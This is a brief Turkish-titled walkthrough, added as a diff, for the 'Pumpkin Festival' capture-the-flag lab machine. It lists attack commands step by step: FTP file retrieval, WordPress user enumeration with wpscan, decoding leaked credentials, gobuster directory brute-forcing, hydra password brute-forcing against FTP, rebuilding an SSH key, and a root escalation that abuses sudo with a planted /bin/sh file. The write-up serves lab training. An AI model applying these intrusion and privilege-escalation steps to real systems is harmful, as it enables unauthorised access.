@@ -1,0 +1,19 @@
+PUMPKIN FESTIVAL MAKİNE ÇÖZÜMÜ
+1 - IP Adresi 192.168.2.151 makine ekranında yazıyor.
+2 - ftp 192.168.2.151, cd secret, get token.txt
+3 - http://192.168.2.151/store/stack.txt, Tracking Code: 2542 8231 6783 486
+4 - nano /etc/hosts, 192.168.2.151 pumpkins.local
+5 - wpscan --url http://pumpkins.local -e u
+6 - http://pumpkins.local/readme.html, K82v0SuvV1En350M0uxiXVRTmBrQIJQN78s
+7 - echo K82v0SuvV1En350M0uxiXVRTmBrQIJQN78s | base62 -d, morse & jack : Ug0t!TrIpyJ
+8 - http://pumpkins.local/wp-admin, morse:Ug0t!TrIpyJ
+9 - gobuster dir -u http://pumpkins.local -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
+10 - Users: admin, morse, jack, harry
+11 - hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.151, harry:yrrah
+12 - file data.txt, tar vxf data.txt, tar xjf data, tar vxf key, cat jack | xxd -r -p > id_rsa
+13 - ssh -i id_rsa -p 6880 jack@192.168.2.151
+14 - sudo -l
+15 - mkdir pumpkins
+16 - echo "/bin/sh" > /home/jack/pumpkins/alohomora
+17 - chmod 777 /home/jack/pumpkins/alohomora
+18 - sudo /home/jack/pumpkins/alohomora
